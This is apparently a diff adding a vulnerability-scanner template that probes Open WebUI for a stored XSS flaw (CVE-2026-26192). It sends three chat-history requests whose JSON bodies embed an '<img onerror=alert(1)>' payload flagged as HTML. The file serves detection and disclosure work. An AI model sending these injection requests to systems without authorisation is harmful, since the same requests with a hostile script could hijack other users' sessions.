@@ -1,0 +1,83 @@
+[info]
+author = "AVE"
+description = "检测 Open WebUI 引文预览中的存储型 XSS 漏洞（CVE-2026-26192）。攻击者通过修改聊天历史文档元数据设置 html=true，使前端将用户控制的 HTML 内容通过 srcdoc 渲染至 iFrame（sandbox=allow-scripts allow-same-origin），实现跨站脚本攻击。影响版本 <= 0.6.43，修复版本 >= 0.7.0。"
+id = "POC-AVE-2026-0049"
+name = "CVE-2026-26192 PoC"
+severity = "high"
+tags = [
+    "cve-2026-26192",
+    "open-webui",
+    "xss",
+    "stored-xss",
+]
+vuln_id = [
+    "CVE-2026-26192",
+    "GHSA-xc8p-9rr6-97r2",
+    "AVE-2026-0049",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/chat/history"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"chat_id":"test","history":{"messages":[{"role":"assistant","content":"test","documents":[{"document":"<img src=x onerror=alert(1)>","metadata":{"html":true,"source":"cve-poc"}}]}]}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "true",
+]
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/api/chat/history"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"chat_id":"test","history":{"messages":[{"role":"assistant","content":"test","documents":[{"document":"<img src=x onerror=alert(1)>","metadata":{"html":true,"source":"cve-poc"}}]}]}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "true",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/chat/test/history"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"history":{"messages":[{"role":"assistant","documents":[{"document":"<img src=x onerror=alert(1)>","metadata":{"html":true,"source":"cve-poc"}}]}]}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "true",
+]
